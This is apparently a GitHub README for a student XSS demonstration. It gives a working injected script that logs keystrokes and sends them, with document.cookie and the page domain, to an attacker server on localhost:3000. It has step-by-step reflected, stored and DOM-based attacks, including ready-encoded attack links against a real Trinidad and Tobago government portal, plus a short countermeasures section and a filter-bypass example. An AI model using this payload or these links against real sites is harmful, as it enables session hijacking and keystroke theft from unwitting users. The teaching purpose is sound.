# TTC-Connect XSS
This is a demo project designed to demonstrate how cross-site scripting works and how it can be used to exploit vulnerabilities in websites. 


## Description
Our demo environment will consist of a specially crafted malicious code which performs the following:
* Capture the session domain of the victim
* Capture the session cookie of the victim
* Capture the key strokes of the victim
* Sends the captured information to our attacker server and save it to a file

This script will be used to perform a:
* [Reflected XSS Attack](https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001))
* [Stored XSS Attack](https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002))
* [DOM-based XSS Attack](https://www.owasp.org/index.php/DOM_Based_XSS)

### Requirements
The following components needs to be installed to replicate the demo
* [Node JS](https://nodejs.org/en/) - Install NoeJs to run and host our attacker server
* A browser with XSS Filter disabled - IE was used in our demonstration
* A browser with XSS Filter enabled - Chrome was used in our demonstration



### Locate a exploitable website 
* We used [TT-Connect](http://www.ttconnect.gov.tt/gortt/portal/ttconnect/!ut/p/a1/04_Sj9CPykssy0xPLMnMz0vMAfGjzOK9A40MTD0tjQ38Aw0sDYyCPA1dDUy9jd29DIAKIoEKDHAARwNC-r3ACvDoB1pgVOTr7JuuH1WQWJKhm5mXlq8fUVKSnJ-Xl5pcoh-uH4VmR5C7G9AOV1NDD-8wY6AhUAV47CjIjajySQv2BACEOlbd/dl5/d5/L2dBISEvZ0FBIS9nQSEh/) Website as our example.
* To determine whether a site is susceptible to a XSS attack, we perform the following tests:
  * HTML Test
    ```
    <h1> test </h1>
    ```
  * Plain Javascript Test
    ```
    <script< alert('test') </script>
    ```
  * HTML Attribute Test
    ```
    <svg onload=alert(1)>
    ```
    
  * HTML Attribute Javascript Test
    ```
    <svg onload=alert(1)>
    ```
  Enter the above codes in the [TT-Connect](http://www.ttconnect.gov.tt/gortt/portal/ttconnect/!ut/p/a1/04_Sj9CPykssy0xPLMnMz0vMAfGjzOK9A40MTD0tjQ38Aw0sDYyCPA1dDUy9jd29DIAKIoEKDHAARwNC-r3ACvDoB1pgVOTr7JuuH1WQWJKhm5mXlq8fUVKSnJ-Xl5pcoh-uH4VmR5C7G9AOV1NDD-8wY6AhUAV47CjIjajySQv2BACEOlbd/dl5/d5/L2dBISEvZ0FBIS9nQSEh/) Website as our example. search bar to see the result. 
  
  You should get the following results:
  * On a XSS Filtered enabled browser, only HTML test will pass
  * On a XSS Filtered disabled browser, all test except Plain Javascript test will pass
 
### Design your malicious script
We have designed the following script to attack our target websites
```
 <!-- Injected script that logs user's key press, domain and -->
    <img hidden src='x' onerror="document.onkeypress=function(e){ 
        var xhr = new XMLHttpRequest(); //Create new http request
        //Configure HTTP POST request to be send to attacker server
        xhr.open('POST', 'http://localhost:3000/candy?k='+String.fromCharCode(e.which)); //Send keystroke as paramater
        //Allow CORS and use of JSON 
        xhr.setRequestHeader('Content-Type', 'application/json', 'Access-Control-Allow-Origin','localhost:3000'); 
        //Send HTTP POST request with the defined body containing cookie and domain
        xhr.send(JSON.stringify({domain:document.domain , cookie: document.cookie}))}"
    />
```
Usable Minimized Version
```
 <img hidden src='x' onerror="document.onkeypress=function(e){ var xhr = new XMLHttpRequest(); xhr.open('POST', 'http://localhost:3000/candy?k='+String.fromCharCode(e.which)); xhr.setRequestHeader('Content-Type', 'application/json', 'Access-Control-Allow-Origin','localhost:3000'); xhr.send(JSON.stringify({domain:document.domain , cookie: document.cookie}))}"/>
```

### Perform a Reflected XSS Attack
* Clone this project
  ```
  git clone https://github.com/HaifengMei/ttconnect-xss.git
  ```
* Go inside project directory
  ```
  cd ttconnect-xss
  ```
* Install necessary packages
  ```
  npm install
  ```
* Run application server
  ```
  node app.js
  ```
* Access on a  XSS Filter disabled browser the following link which has the attack script injected
[Injected TT Connect Link](http://www.ttconnect.gov.tt/gortt/portal/ttconnect/!ut/p/a1/04_Sj9CPykssy0xPLMnMz0vMAfGjzOK9A40MTD0tjQ0sfLycDYyCfM1CLf0MDA3cDYEKIpEV-Ae5uwEVuJoaeniHGRsYGBCn3wAHcCSoP1w_ClWJf6CBJVCJp6Grgam3sbuXAYYCTCeCFeBxQ0FuaIRBpqciAKjdE-c!/dl5/d5/L2dBISEvZ0FBIS9nQSEh/?searchKeyword=++++%3Cimg+hidden+src%3D%27x%27+onerror%3D%22document.onkeypress%3Dfunction%28e%29%7B+var+xhr+%3D+new+XMLHttpRequest%28%29%3B+xhr.open%28%27POST%27%2C+%27http%3A%2F%2Flocalhost%3A3000%2Fcandy%3Fk%3D%27%2BString.fromCharCode%28e.which%29%29%3B+xhr.setRequestHeader%28%27Content-Type%27%2C+%27application%2Fjson%27%2C+%27Access-Control-Allow-Origin%27%2C%27localhost%3A3000%27%29%3B+xhr.send%28JSON.stringify%28%7Bdomain%3Adocument.domain+%2C+cookie%3A+document.cookie%7D%29%29%7D%22%2F%3E&ctl00%24HomeSearchBar1%24HiddenField1=&selectedCategory=entireSite&ctl00%24HomeSearchBar1%24submit_button.x=0&ctl00%24HomeSearchBar1%24submit_button.y=0)

* Type something on the page so the script will activate

* Open sessiondata.txt in your project root directory to see logged information

### Perform a Stored XSS Attack
* Ensure the attack server is running
* Access the following
[Vulnerable Forum](https://xss-game.appspot.com/level2/frame)
* The website current contains no cookies, you may set the cookie to a value for demonstration purposes
  * Juse open console with F12 and type the following and press enter
    ```
    document.cookie = "username: Persius, password: 1234"
    ```
* Submit the following script as a comment
```
 <img hidden src='x' onerror="document.onkeypress=function(e){ var xhr = new XMLHttpRequest(); xhr.open('POST', 'http://localhost:3000/candy?k='+String.fromCharCode(e.which)); xhr.setRequestHeader('Content-Type', 'application/json', 'Access-Control-Allow-Origin','localhost:3000'); xhr.send(JSON.stringify({domain:document.domain , cookie: document.cookie}))}"/>
```
* Type something on the page so the script will activate

* Open sessiondata.txt in your project root directory to see logged information

### Perform a DOM-based XSS Attack
* Ensure the attack server is running
* The website current contains no cookies, you may set the cookie to a value for demonstration purposes
  * Juse open console with F12 and type the following and press enter
    ```
    document.cookie = "username: DOMinic, password: 4321"
    ```
* Access the following injected link
[Injected TT Connect Link](https://xss-game.appspot.com/level1/frame?query=%3Cimg+hidden+src%3D%27x%27+onerror%3D%22document.onkeypress%3Dfunction%28e%29%7B+var+xhr+%3D+new+XMLHttpRequest%28%29%3B+xhr.open%28%27POST%27%2C+%27http%3A%2F%2Flocalhost%3A3000%2Fcandy%3Fk%3D%27%2BString.fromCharCode%28e.which%29%29%3B+xhr.setRequestHeader%28%27Content-Type%27%2C+%27application%2Fjson%27%2C+%27Access-Control-Allow-Origin%27%2C%27localhost%3A3000%27%29%3B+xhr.send%28JSON.stringify%28%7Bdomain%3Adocument.domain+%2C+cookie%3A+document.cookie%7D%29%29%7D%22%2F%3E)

* Type something on the page so the script will activate

* Open sessiondata.txt in your project root directory to see logged information

### Counter Measures
* [X-XSS-Protection](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection)
  * Try [Injected TT Connect Link](http://www.ttconnect.gov.tt/gortt/portal/ttconnect/!ut/p/a1/04_Sj9CPykssy0xPLMnMz0vMAfGjzOK9A40MTD0tjQ0sfLycDYyCfM1CLf0MDA3cDYEKIpEV-Ae5uwEVuJoaeniHGRsYGBCn3wAHcCSoP1w_ClWJf6CBJVCJp6Grgam3sbuXAYYCTCeCFeBxQ0FuaIRBpqciAKjdE-c!/dl5/d5/L2dBISEvZ0FBIS9nQSEh/?searchKeyword=++++%3Cimg+hidden+src%3D%27x%27+onerror%3D%22document.onkeypress%3Dfunction%28e%29%7B+var+xhr+%3D+new+XMLHttpRequest%28%29%3B+xhr.open%28%27POST%27%2C+%27http%3A%2F%2Flocalhost%3A3000%2Fcandy%3Fk%3D%27%2BString.fromCharCode%28e.which%29%29%3B+xhr.setRequestHeader%28%27Content-Type%27%2C+%27application%2Fjson%27%2C+%27Access-Control-Allow-Origin%27%2C%27localhost%3A3000%27%29%3B+xhr.send%28JSON.stringify%28%7Bdomain%3Adocument.domain+%2C+cookie%3A+document.cookie%7D%29%29%7D%22%2F%3E&ctl00%24HomeSearchBar1%24HiddenField1=&selectedCategory=entireSite&ctl00%24HomeSearchBar1%24submit_button.x=0&ctl00%24HomeSearchBar1%24submit_button.y=0) on a XSS-Filter enabled browser, it will get blocked
  
 * Implement [XSS Prevention Rules](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet#XSS_Prevention_Rules) by performing the following searched on [XSS-Proof Website](https://agriculture.gov.tt/):
 * Escaped HTML Test
   ```
   <h1> test </h1>
   ```
 * Escaped Plain Javascript Test
   ```
   <script< alert('test') </script>
   ```
 * Escaped HTML Attribute Test
   ```
   <svg onload=alert(1)>
   ```
 * Escaped HTML Attribute Javascript Test
   ```
   <svg onload=alert(1)>
   ```
### XSS Filter Bypass
Although X-XSS-Protection designed into browser works for common attacks, there exits [bypasses](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet) that allow hackers to execute their malicious scripts.

A Japanese hacker posted a [github repo](https://github.com/masatokinugawa/filterbypass/wiki/Browser%27s-XSS-Filter-Bypass-Cheat-Sheet#ieedge%E3%81%AExss%E3%83%95%E3%82%A3%E3%83%AB%E3%82%BF%E3%83%BC) that contains some working bypass for the latest XSS filters in Chrome, IE11/Edge and Safari

Following example shows that rearranging the script and encoding some characters will bypass the filter in Chrome
```
<svg o<script>nload=alert(1)>
↓
<svg onload=alert(1)>
```
Try the link and see for yourself

https://vulnerabledoma.in/bypass/text?type=6&q=%3Csvg%20o%3Cscript%3Enload=alert(1)%3E
